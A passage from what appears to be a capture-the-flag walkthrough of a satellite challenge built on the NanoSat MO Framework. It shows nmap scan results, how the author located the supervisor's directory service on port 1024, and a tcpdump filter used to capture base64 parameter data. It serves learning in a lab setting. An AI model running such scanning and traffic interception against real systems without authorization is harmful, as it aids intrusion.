Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 9.4p1 Debian 1 (protocol 2.0)
| ssh-hostkey:
|   256 3c:66:fe:c4:3f:04:77:59:5d:d4:f0:9f:ee:7c:bc:07 (ECDSA)
|_  256 15:40:ce:18:e2:3a:25:e8:b6:66:38:05:e3:29:92:51 (ED25519)
5900/tcp filtered vnc
6901/tcp filtered jetstream
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (1 host up) scanned in 2.89 seconds
```

Attempting to input any information into the **Directory Service URI** field in the Consumer Test Tool throws an exception.

![Pasted image 20231231180208.png](Pasted%20image%2020231231180208.png)

The `org.ccsds.moims.mo.mal.MalException` classpath was referring to [CCSDS MO Services](https://en.wikipedia.org/wiki/CCSDS_MO_Services). That page also references _NanoSat_ and the [NanoSat MO Framework](https://en.wikipedia.org/wiki/NanoSat_MO_Framework), an open-source framework for small satellites based on CCSDS Mission Operations services.

> The MO Services are a standard set of end-to-end services between functions resident on board a spacecraft or based on the ground.

> The NanoSat MO Framework is built upon the [CCSDS Mission Operations services Architecture](https://en.wikipedia.org/wiki/CCSDS_Mission_Operations "CCSDS Mission Operations") and therefore it inherits its properties such as being transport-agnostic, multi-domain, and programming language independent. Additionally, it is independent from any specific satellite platform.

- The NanoSat MO Framework repository is [here](https://github.com/esa/nanosat-mo-framework).
- Documentation for the Consumer Test Tool is [here](https://nanosat-mo-framework.readthedocs.io/en/latest/sdk.html?highlight=consumer%20test#consumer-test-tool-ctt).

The CTT can be used to connect with the supervisor to launch, connect, and interact with apps. The directory URI follows the pattern `maltcp://SOME_ADDRESS:PORT/nanosat-mo-supervisor-Directory`.

There is no default supervisor port explicitly mentioned in the documentation. Though there is mention of connecting [NMF Space Apps to a Supervisor's Directory Service](https://nanosat-mo-framework.readthedocs.io/en/latest/netbeans.html?highlight=supervisor%20port#nmf-space-apps) which uses port 1024 as an example. An attempt to fetch information over this port using the Directory Service URI of  `maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory` turned out correct and successfully listed providers and services running on the Nanosat.

> It turns out this information was written inside the README file extracted with the Dockerfile and build script. But, I overlooked it and wasted an hour scouring the documentation.

There doesn't seem to be an easy way to capture all this base64 encoded data. But since we are provided the `tcpdump` binary and Wireshark on the client container, the incoming packet data can be captured and written to the file given that we discover certain criteria to filter out the other junk.

With Wireshark capturing, I snapped an image and captured the incoming packets after clicking the `getValue` button for the parameter.

This sent a ton of Base64-encoded data to my client in 800+ different packets, with the packet size a minimum of 1394 bytes. Using the `tcpdump` utility on the client container and a capture filter one can only capture the incoming packets greater than that minimum packet size and sent over that provider's `maltcp` port of 1025.

```bash
~$ tcpdump -i wgclient -w incoming.pcap 'tcp port 1025 and ip[2:2] > 1395'
```

This captured around 800 packets again. Using `tcpdump` with `grep` and `sed` the packet data can be filtered out, then carve out only the base64-encoded data.
